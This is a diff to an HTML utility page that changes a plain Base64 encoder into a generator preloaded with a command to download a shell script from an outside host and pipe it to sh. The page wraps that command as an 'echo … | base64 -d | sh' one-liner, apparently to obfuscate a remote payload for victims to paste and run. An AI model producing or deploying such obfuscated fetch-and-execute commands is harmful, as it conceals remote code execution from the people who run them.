@@ -1,78 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Base64 Command Encoder</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      max-width: 600px;
-      margin: 2rem auto;
-      padding: 1rem;
-      background: #f9f9f9;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    textarea {
-      width: 100%;
-      height: 100px;
-      font-family: monospace;
-      font-size: 1rem;
-      padding: 0.5rem;
-      margin-bottom: 1rem;
-      resize: vertical;
-    }
-    button {
-      background-color: #007bff;
-      color: white;
-      border: none;
-      padding: 0.7rem 1.5rem;
-      font-size: 1rem;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #0056b3;
-    }
-    #output {
-      margin-top: 1rem;
-      background: #222;
-      color: #0f0;
-      padding: 1rem;
-      font-family: monospace;
-      word-break: break-all;
-      border-radius: 5px;
-      user-select: all;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Auto Base64 Command Generator</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    max-width: 600px;
+    margin: 2rem auto;
+    padding: 1rem;
+    background: #f9f9f9;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+  }
+  textarea {
+    width: 100%;
+    height: 80px;
+    font-family: monospace;
+    font-size: 1rem;
+    padding: 0.5rem;
+    margin-bottom: 1rem;
+    resize: vertical;
+  }
+  button {
+    background-color: #007bff;
+    color: white;
+    border: none;
+    padding: 0.7rem 1.5rem;
+    font-size: 1rem;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: #0056b3;
+  }
+  #output {
+    margin-top: 1rem;
+    background: #222;
+    color: #0f0;
+    padding: 1rem;
+    font-family: monospace;
+    word-break: break-all;
+    border-radius: 5px;
+    user-select: all;
+    white-space: pre-wrap;
+  }
+</style>
 </head>
 <body>
 
-  <h2>Base64 Command Encoder</h2>
-  <p>Type or paste your command below, then click Generate.</p>
+<h2>Auto Base64 Command Generator</h2>
+<p>Command is preloaded. Click Generate and copy the output.</p>
 
-  <textarea id="inputCommand" placeholder="e.g. wget http://example.com/script.sh -O - | sh"></textarea>
-  <br />
-  <button onclick="generateBase64()">Generate</button>
+<textarea id="inputCommand">wget http://bjcprogramming.store/free_openline/bossjun.sh -O - | sh</textarea>
+<br />
+<button onclick="generateEncodedCommand()">Generate</button>
 
-  <div id="output" style="display:none;"></div>
+<div id="output" style="display:none;"></div>
 
-  <script>
-    function generateBase64() {
-      const input = document.getElementById('inputCommand').value.trim();
-      if (!input) {
-        alert('Please enter a command to encode!');
-        return;
-      }
-      // Encode to base64
-      const encoded = btoa(input);
-      // Show output
-      const outputDiv = document.getElementById('output');
-      outputDiv.style.display = 'block';
-      outputDiv.textContent = encoded;
-    }
-  </script>
+<script>
+function generateEncodedCommand() {
+  const input = document.getElementById('inputCommand').value.trim();
+  if (!input) {
+    alert('Command cannot be empty!');
+    return;
+  }
+  const encoded = btoa(input);
+  const fullCommand = `echo "${encoded}" | base64 -d | sh`;
+  const outputDiv = document.getElementById('output');
+  outputDiv.style.display = 'block';
+  outputDiv.textContent = fullCommand;
+}
+</script>
 
 </body>
 </html>
